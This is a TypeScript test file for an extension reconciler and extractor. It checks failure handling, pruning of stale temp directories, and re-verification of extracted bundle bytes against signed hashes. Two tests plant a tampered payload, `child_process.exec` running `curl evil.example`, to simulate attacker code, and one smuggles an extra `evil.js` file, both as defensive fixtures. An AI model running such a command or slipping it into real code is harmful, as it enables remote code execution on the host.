import { afterEach, describe, it, expect, vi } from 'vitest';
import { Hono } from 'hono';
import { createHash, type KeyObject } from 'node:crypto';
import {
  existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, utimesSync, writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import JSZip from 'jszip';
import type { ExtensionManifestV1 } from '@breeze/extension-sdk';
import {
  extractVerifiedPayload,
  pruneStaleExtractionDirs,
  reconcileExtensions,
  type ReconcilePorts,
} from './reconciler';
import { ExtensionIncompatibleError } from './errors';
import {
  ExtensionContributionRegistry,
  type StagedExtensionContributions,
} from './contributionRegistry';
import {
  ExtensionStateStore,
  type ExtensionStateBackend,
  type ExtensionStateRecord,
  type ObservedExtensionInput,
} from './stateStore';
import type { ExtensionLifecycleState } from '../db/schema/extensions';
import type { VerifiedExtensionBundle } from './bundleVerifier';
import type { ExtensionDeploymentConfig, ExtensionSelection } from './config';
import { clearExtensionWebAsset, getExtensionWebAsset } from './webAssets';

/**
 * The reconciler is exercised entirely through injected ports, so these unit
 * tests need no bundle, no filesystem, and no database. Each fixture wires a
 * real {@link ExtensionContributionRegistry} plus an in-memory state store, then
 * stubs every phase to succeed except the one named by `failAt`. That isolates
 * the loop's failure policy (the whole point of Task 4) from every I/O seam.
 */
class InMemoryExtensionStateBackend implements ExtensionStateBackend {
  private readonly rows = new Map<string, ExtensionStateRecord>();
  private readonly floors = new Map<string, Map<string, string>>();

  async upsertObserved(input: ObservedExtensionInput): Promise<void> {
    const existing = this.rows.get(input.name);
    if (existing) {
      existing.updatedAt = new Date();
      return;
    }
    this.rows.set(input.name, {
      name: input.name,
      configuredVersion: input.configuredVersion ?? null,
      activeVersion: input.activeVersion ?? null,
      artifactDigest: input.digest ?? null,
      publisherId: input.publisher ?? null,
      manifestApiVersion: input.manifestApiVersion ?? null,
      serverSdkVersion: input.serverSdkVersion ?? null,
      webSdkVersion: input.webSdkVersion ?? null,
      enabled: true,
      lifecycleState: 'discovered',
      lastErrorCategory: null,
      lastErrorMessage: null,
      migratedAt: null,
      activatedAt: null,
      updatedAt: new Date(),
    });
  }

  async setEnabled(name: string, enabled: boolean): Promise<void> {
    const row = this.rows.get(name);
    if (row) { row.enabled = enabled; row.updatedAt = new Date(); }
  }

  async getRow(name: string): Promise<ExtensionStateRecord | null> {
    const row = this.rows.get(name);
    return row ? { ...row } : null;
  }

  async listRows(): Promise<ExtensionStateRecord[]> {
    return [...this.rows.values()]
      .map((row) => ({ ...row }))
      .sort((a, b) => a.name.localeCompare(b.name));
  }

  async recordFailure(
    name: string,
    state: Extract<ExtensionLifecycleState, 'failed' | 'incompatible'>,
    category: string,
    message: string,
  ): Promise<void> {
    const row = this.rows.get(name);
    if (!row) return;
    row.lifecycleState = state;
    row.lastErrorCategory = category;
    row.lastErrorMessage = message;
    row.updatedAt = new Date();
  }

  async recordActive(name: string, activeVersion: string | null): Promise<void> {
    const row = this.rows.get(name);
    if (!row) return;
    row.lifecycleState = 'active';
    row.lastErrorCategory = null;
    row.lastErrorMessage = null;
    row.activatedAt = new Date();
    row.updatedAt = new Date();
    if (activeVersion !== null) row.activeVersion = activeVersion;
  }

  async insertSchemaFloor(name: string, version: string, floor: string): Promise<void> {
    let byVersion = this.floors.get(name);
    if (!byVersion) { byVersion = new Map(); this.floors.set(name, byVersion); }
    byVersion.set(version, floor);
  }

  async listSchemaFloors(name: string): Promise<string[]> {
    return [...(this.floors.get(name)?.values() ?? [])];
  }
}

function fakeManifest(): ExtensionManifestV1 {
  return {
    apiVersion: 'breeze.extensions/v1',
    name: 'demo',
    version: '1.2.3',
    routeNamespace: 'demo',
    requires: { breeze: '*', serverSdk: '*', capabilities: [] },
    server: { entry: 'dist/index.cjs' },
    migrationsDir: 'migrations',
    schemaCompatibilityFloor: '1.0.0',
    jobs: [],
    aiTools: [],
    tenancy: {
      orgCascadeDeleteTables: [],
      deviceCascadeDeleteTables: [],
      deviceOrgDenormalizedTables: [],
    },
  } as ExtensionManifestV1;
}

function fakeBundle(): VerifiedExtensionBundle {
  return {
    archivePath: '/tmp/demo.breeze-ext',
    artifactDigest: `sha256:${'a'.repeat(64)}`,
    manifest: fakeManifest(),
    files: new Map(),
  } as VerifiedExtensionBundle;
}

function fakeStaged(): StagedExtensionContributions {
  return {
    name: 'demo',
    version: '1.2.3',
    manifest: fakeManifest(),
    routeApp: null,
    jobs: new Map(),
    aiTools: new Map(),
    enabled: true,
  };
}

type Phase = 'compatibility' | 'migration' | 'register';

async function reconcileFixture(
  { required, failAt, storeRoot, stateStore: providedStore }: {
    required: boolean;
    failAt?: Phase;
    storeRoot?: string;
    stateStore?: ExtensionStateStore;
  },
) {
  const registry = new ExtensionContributionRegistry();
  const stateStore = providedStore ?? new ExtensionStateStore(new InMemoryExtensionStateBackend());
  const selection: ExtensionSelection = {
    name: 'demo',
    uri: 'file:///demo.breeze-ext',
    version: '1.2.3',
    publisher: 'breeze',
    required,
    rollout: 'rolling',
  };
  const config: ExtensionDeploymentConfig = {
    publishers: { breeze: { publicKeyFile: '/keys/breeze.pub' } },
    extensions: [selection],
  };

  const ports: Partial<ReconcilePorts> = {
    loadDeploymentConfig: () => config,
    createMigrationSql: () => null,
    acquire: async () => '/tmp/demo.breeze-ext',
    trustFor: () => ({ publisher: 'breeze', publicKey: {} as KeyObject }),
    verify: async () => fakeBundle(),
    assertCompatible: () => {
      if (failAt === 'compatibility') {
        throw new ExtensionIncompatibleError(['simulated host incompatibility']);
      }
    },
    extractVerifiedPayload: async () => '/tmp/extracted/demo',
    loadServerEntry: async () => ({ register: async () => {} }),
    runMigrations: async () => {
      if (failAt === 'migration') throw new Error('simulated migration failure');
    },
    publishTenancy: () => {},
    stageExtension: async () => {
      if (failAt === 'register') throw new Error('simulated register failure');
      return fakeStaged();
    },
    validateTenancyAndContributions: async () => {},
    sweepUnaccountedTables: async () => {},
  };

  const summary = await reconcileExtensions({
    app: new Hono(),
    configPath: '/tmp/extensions.yaml',
    storeRoot: storeRoot ?? '/tmp/store',
    registry,
    stateStore,
    ports,
  });
  return { summary, registry, stateStore };
}

describe('reconcileExtensions', () => {
  afterEach(() => {
    clearExtensionWebAsset('demo');
  });

  it('retains { root, digest, files } for an extension that activates successfully', async () => {
    const { summary } = await reconcileFixture({ required: false });
    expect(summary.activated).toEqual(['demo']);

    // This is the SAME single retention path task-2 wires alongside
    // registerExtensionRoot/clearExtensionRoot (reconciler.ts) — the digest and
    // files inventory that VerifiedExtensionBundle otherwise discards after the
    // reconcile loop.
    expect(getExtensionWebAsset('demo')).toEqual({
      root: '/tmp/extracted/demo',
      digest: fakeBundle().artifactDigest,
      files: fakeBundle().files,
    });
  });

  it('clears a previously retained web asset when a later reconcile attempt fails', async () => {
    await reconcileFixture({ required: false });
    expect(getExtensionWebAsset('demo')).toBeDefined();

    // A subsequent failed reconcile (e.g. an update attempt) must clear the
    // stale entry on the SAME withdraw/failure path that clears the extracted
    // root — otherwise a later asset route could keep serving a
    // withdrawn/failed extension's bytes.
    const { summary } = await reconcileFixture({ required: false, failAt: 'migration' });
    expect(summary.failed).toEqual(['demo']);
    expect(getExtensionWebAsset('demo')).toBeUndefined();
  });

  it('continues after an optional migration rollback but fails startup for required', async () => {
    const optional = await reconcileFixture({ required: false, failAt: 'migration' });
    expect(optional.summary.failed).toEqual(['demo']);

    await expect(reconcileFixture({ required: true, failAt: 'migration' }))
      .rejects.toThrow(/required extension demo/);
  });

  it('does not expose staged contributions after activation failure', async () => {
    const { registry } = await reconcileFixture({ required: false, failAt: 'register' });
    expect(registry.get('demo')?.enabled).not.toBe(true);
  });

  // ISOLATION. Recording an extension's failure is best-effort recovery
  // bookkeeping; a DB error while writing it (plausibly the very condition that
  // failed the phase) must NOT escalate an OPTIONAL extension's failure into a
  // whole-API boot abort. Before the fix, the un-wrapped recordFailure write
  // propagated straight out of reconcile and into process.exit(1).
  it('does not abort startup when recording an OPTIONAL failure itself throws', async () => {
    class ThrowingRecordFailureBackend extends InMemoryExtensionStateBackend {
      override async recordFailure(): Promise<void> {
        throw new Error('db down during failure recording');
      }
    }
    const stateStore = new ExtensionStateStore(new ThrowingRecordFailureBackend());
    const { summary } = await reconcileFixture({ required: false, failAt: 'migration', stateStore });
    expect(summary.failed).toEqual(['demo']);
  });

  // The mirror case: a REQUIRED extension still aborts boot even when recording
  // its failure throws — but via the sanitized RequiredExtensionError, NEVER the
  // raw DB error (which the boot logger could leak).
  it('still aborts startup for a required extension when recording the failure throws', async () => {
    class ThrowingRecordFailureBackend extends InMemoryExtensionStateBackend {
      override async recordFailure(): Promise<void> {
        throw new Error('db down during failure recording');
      }
    }
    const stateStore = new ExtensionStateStore(new ThrowingRecordFailureBackend());
    await expect(reconcileFixture({ required: true, failAt: 'migration', stateStore }))
      .rejects.toThrow(/required extension demo/);
  });

  it('records a sanitized failure that never leaks the raw error text', async () => {
    const { stateStore } = await reconcileFixture({ required: false, failAt: 'migration' });
    const row = await stateStore.get('demo');
    expect(row?.lifecycleState).toBe('failed');
    expect(row?.lastErrorMessage).not.toContain('simulated migration failure');
    expect(row?.lastErrorCategory).toBeTruthy();
  });

  it('persists an incompatible lifecycle when a first-time extension fails compatibility', async () => {
    // Regression: observe now runs BEFORE the compatibility gate, so a
    // never-before-seen extension that fails compatibility still gets an
    // installed_extensions row for recordSanitizedFailure's UPDATE to land on.
    const { summary, stateStore } = await reconcileFixture({
      required: false,
      failAt: 'compatibility',
    });
    expect(summary.failed).toEqual(['demo']);
    const row = await stateStore.get('demo');
    expect(row?.lifecycleState).toBe('incompatible');
    expect(row?.lastErrorCategory).toBe('incompatible');
    expect(row?.lastErrorMessage).not.toContain('simulated host incompatibility');
  });

  it('is a no-op when the deployment config is absent', async () => {
    const registry = new ExtensionContributionRegistry();
    const stateStore = new ExtensionStateStore(new InMemoryExtensionStateBackend());
    const summary = await reconcileExtensions({
      app: new Hono(),
      configPath: '/does/not/exist/extensions.yaml',
      storeRoot: '/tmp/store',
      registry,
      stateStore,
    });
    expect(summary.activated).toEqual([]);
    expect(summary.failed).toEqual([]);
  });
});

/**
 * Crash-orphaned extraction staging directories.
 *
 * `extractVerifiedPayload` stages into `<dest>.tmp-<pid>-<base36>` and renames it
 * into place. A process that dies mid-extract leaves that temp tree behind and
 * nothing ever collected it, so they accumulated on the volume. The prune must
 * claim those and NOTHING else — above all never a committed `sha256-<hex>` tree
 * — and must never be able to break boot.
 */
describe('pruneStaleExtractionDirs', () => {
  const HOUR_MS = 60 * 60 * 1000;
  const DIGEST = 'a'.repeat(64);

  function makeStore(): string {
    const root = mkdtempSync(path.join(tmpdir(), 'breeze-prune-'));
    mkdirSync(path.join(root, 'extracted'), { recursive: true });
    return root;
  }

  /** Create a directory under `extracted/` and backdate it so it reads as stale. */
  function makeAgedDir(root: string, name: string, ageMs: number, files: string[] = []): string {
    const dir = path.join(root, 'extracted', name);
    mkdirSync(dir, { recursive: true });
    for (const file of files) writeFileSync(path.join(dir, file), '');
    const when = new Date(Date.now() - ageMs);
    utimesSync(dir, when, when);
    return dir;
  }

  it('removes a stale temp extraction directory left behind by a crash', async () => {
    const root = makeStore();
    const orphan = makeAgedDir(root, `sha256-${DIGEST}.tmp-1234-abc123`, 4 * HOUR_MS, ['partial.js']);

    await expect(pruneStaleExtractionDirs(root)).resolves.toBe(1);
    expect(existsSync(orphan)).toBe(false);
  });

  it('preserves a committed extraction directory that carries a .verified marker', async () => {
    const root = makeStore();
    // Old enough to be "stale" by age, but committed: no `.tmp-` infix, so it
    // cannot match the temp pattern at all.
    const committed = makeAgedDir(root, `sha256-${DIGEST}`, 90 * 24 * HOUR_MS, ['.verified', 'server.js']);
    const orphan = makeAgedDir(root, `sha256-${DIGEST}.tmp-99-zzz`, 4 * HOUR_MS);

    await expect(pruneStaleExtractionDirs(root)).resolves.toBe(1);

    expect(existsSync(committed)).toBe(true);
    expect(existsSync(path.join(committed, '.verified'))).toBe(true);
    expect(existsSync(path.join(committed, 'server.js'))).toBe(true);
    expect(existsSync(orphan)).toBe(false);
  });

  it('leaves a recent temp directory alone in case a concurrent boot is still extracting', async () => {
    const root = makeStore();
    const inFlight = makeAgedDir(root, `sha256-${DIGEST}.tmp-4321-def456`, 30 * 1000);

    await expect(pruneStaleExtractionDirs(root)).resolves.toBe(0);
    expect(existsSync(inFlight)).toBe(true);
  });

  it('ignores entries under extracted/ that are not this extractor\'s temp dirs', async () => {
    const root = makeStore();
    const foreign = [
      makeAgedDir(root, 'operator-notes', 4 * HOUR_MS),
      makeAgedDir(root, `sha256-${DIGEST}.tmp`, 4 * HOUR_MS),
      makeAgedDir(root, `not-a-digest.tmp-1-abc`, 4 * HOUR_MS),
    ];
    const strayFile = path.join(root, 'extracted', `sha256-${DIGEST}.tmp-7-aaa`);
    writeFileSync(strayFile, 'a file, not a directory');

    await expect(pruneStaleExtractionDirs(root)).resolves.toBe(0);
    for (const dir of foreign) expect(existsSync(dir)).toBe(true);
    expect(existsSync(strayFile)).toBe(true);
  });

  it('is a silent no-op on a store that has never extracted anything', async () => {
    const root = mkdtempSync(path.join(tmpdir(), 'breeze-prune-empty-'));
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      await expect(pruneStaleExtractionDirs(root)).resolves.toBe(0);
      expect(warn).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });

  // Housekeeping must never be able to take startup down with it.
  it('survives an unreadable extracted root and lets reconcile continue', async () => {
    const root = mkdtempSync(path.join(tmpdir(), 'breeze-prune-broken-'));
    // `extracted` is a FILE, so readdir fails (ENOTDIR).
    writeFileSync(path.join(root, 'extracted'), 'not a directory');

    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      await expect(pruneStaleExtractionDirs(root)).resolves.toBe(0);
      expect(warn).toHaveBeenCalled();

      // The real proof: boot still reconciles to a fully activated extension.
      const { summary } = await reconcileFixture({ required: true, storeRoot: root });
      expect(summary.activated).toEqual(['demo']);
      expect(summary.failed).toEqual([]);
    } finally {
      warn.mockRestore();
    }
  });
});

/**
 * TIME-OF-CHECK/TIME-OF-USE at the extract seam.
 *
 * `verifyExtensionBundle` hashes every member through one archive handle and
 * then CLOSES it. `extractVerifiedPayload` re-opens the SAME path later, and the
 * tree it writes is `import()`ed. Anyone able to write the artifact-store root
 * (a compromised sibling container, any non-root process with write access to
 * the mounted volume) can swap the archive in between, so the extractor must
 * re-hash what it reads against `bundle.files` rather than trusting the reopen.
 * Otherwise: arbitrary code execution with a fully passing signature check.
 */
describe('extractVerifiedPayload — re-verifies bytes read after verification', () => {
  async function writeArchive(members: Record<string, string>): Promise<{
    archivePath: string;
    files: Map<string, { sha256: string; uncompressedSize: number }>;
    root: string;
  }> {
    const zip = new JSZip();
    const files = new Map<string, { sha256: string; uncompressedSize: number }>();
    for (const [name, body] of Object.entries(members)) {
      zip.file(name, body);
      const bytes = Buffer.from(body, 'utf8');
      files.set(name, {
        sha256: createHash('sha256').update(bytes).digest('hex'),
        uncompressedSize: bytes.length,
      });
    }
    const buf = await zip.generateAsync({ type: 'nodebuffer' });
    const root = mkdtempSync(path.join(tmpdir(), 'ext-extract-'));
    const archivePath = path.join(root, 'demo.breeze-ext');
    writeFileSync(archivePath, buf);
    return { archivePath, files, root };
  }

  const MEMBERS = { 'manifest.json': '{}', 'server/index.js': 'exports.x = 1;' };

  function bundleOf(
    archivePath: string,
    files: Map<string, { sha256: string; uncompressedSize: number }>,
  ): VerifiedExtensionBundle {
    return {
      archivePath,
      artifactDigest: `sha256:${'a'.repeat(64)}`,
      manifest: {} as ExtensionManifestV1,
      files,
    };
  }

  it('extracts every verified member when the bytes still match', async () => {
    const { archivePath, files, root } = await writeArchive(MEMBERS);
    const dest = await extractVerifiedPayload(bundleOf(archivePath, files), root);

    expect(readFileSync(path.join(dest, 'server/index.js'), 'utf8')).toBe('exports.x = 1;');
    expect(existsSync(path.join(dest, '.verified'))).toBe(true);
  });

  it('throws and commits nothing when a member no longer matches its verified hash', async () => {
    const { archivePath, files, root } = await writeArchive({
      ...MEMBERS,
      // What is on disk now — attacker-controlled code, swapped in post-verify.
      'server/index.js': 'require("child_process").exec("curl evil.example");',
    });
    // ...but the verifier recorded the hash of the ORIGINAL, signed bytes.
    const original = Buffer.from(MEMBERS['server/index.js'], 'utf8');
    files.set('server/index.js', {
      sha256: createHash('sha256').update(original).digest('hex'),
      uncompressedSize: original.length,
    });

    const bundle = bundleOf(archivePath, files);
    await expect(extractVerifiedPayload(bundle, root)).rejects.toThrow(/integrity re-check failed/i);

    // No usable tree: neither the committed dest nor a leftover temp dir may
    // exist, and the tampered bytes must never have been written anywhere.
    const dest = path.join(root, 'extracted', `sha256-${'a'.repeat(64)}`);
    expect(existsSync(dest)).toBe(false);
    const leftovers = existsSync(path.join(root, 'extracted'))
      ? readdirSync(path.join(root, 'extracted'))
      : [];
    expect(leftovers).toEqual([]);
  });

  // The reuse shortcut was the ONLY unverified path into `import()`. The archive
  // is re-verified on every boot, so an attacker with write access to the
  // artifact-store volume does the strictly easier thing: skip the archive and
  // overwrite `extracted/sha256-<hex>/<entry>` directly. The `.verified` marker
  // then short-circuits extraction and `loadServerEntry` imports the tampered
  // file with no hash ever computed — same arbitrary-code-execution outcome.
  it('re-extracts instead of reusing an extracted tree whose bytes were tampered with on disk', async () => {
    const { archivePath, files, root } = await writeArchive(MEMBERS);
    const bundle = bundleOf(archivePath, files);

    const dest = await extractVerifiedPayload(bundle, root);
    expect(existsSync(path.join(dest, '.verified'))).toBe(true);

    // Tamper post-extraction, leaving the `.verified` marker in place.
    const entryPath = path.join(dest, 'server/index.js');
    writeFileSync(entryPath, 'require("child_process").exec("curl evil.example");');

    const reused = await extractVerifiedPayload(bundle, root);

    expect(reused).toBe(dest);
    // The tampered bytes are gone: what a subsequent loadServerEntry would read
    // is the verified content from the signed archive.
    expect(readFileSync(entryPath, 'utf8')).toBe(MEMBERS['server/index.js']);
    expect(existsSync(path.join(dest, '.verified'))).toBe(true);
  });

  // A verified member may `require()` a sibling, so a file that is not in the
  // signed inventory is reachable code even though no member's hash changed.
  it('re-extracts when an extra file appears in a previously verified tree', async () => {
    const { archivePath, files, root } = await writeArchive(MEMBERS);
    const bundle = bundleOf(archivePath, files);

    const dest = await extractVerifiedPayload(bundle, root);
    const smuggled = path.join(dest, 'server/evil.js');
    writeFileSync(smuggled, 'module.exports = 1;');

    await extractVerifiedPayload(bundle, root);

    expect(existsSync(smuggled)).toBe(false);
    expect(readFileSync(path.join(dest, 'server/index.js'), 'utf8'))
      .toBe(MEMBERS['server/index.js']);
  });

  it('reuses an untampered verified tree without rewriting it', async () => {
    const { archivePath, files, root } = await writeArchive(MEMBERS);
    const bundle = bundleOf(archivePath, files);

    const dest = await extractVerifiedPayload(bundle, root);
    const before = statSync(path.join(dest, 'server/index.js')).ino;

    expect(await extractVerifiedPayload(bundle, root)).toBe(dest);
    // Same inode ⇒ the happy path did not re-extract and rename a fresh tree.
    expect(statSync(path.join(dest, 'server/index.js')).ino).toBe(before);
  });
});
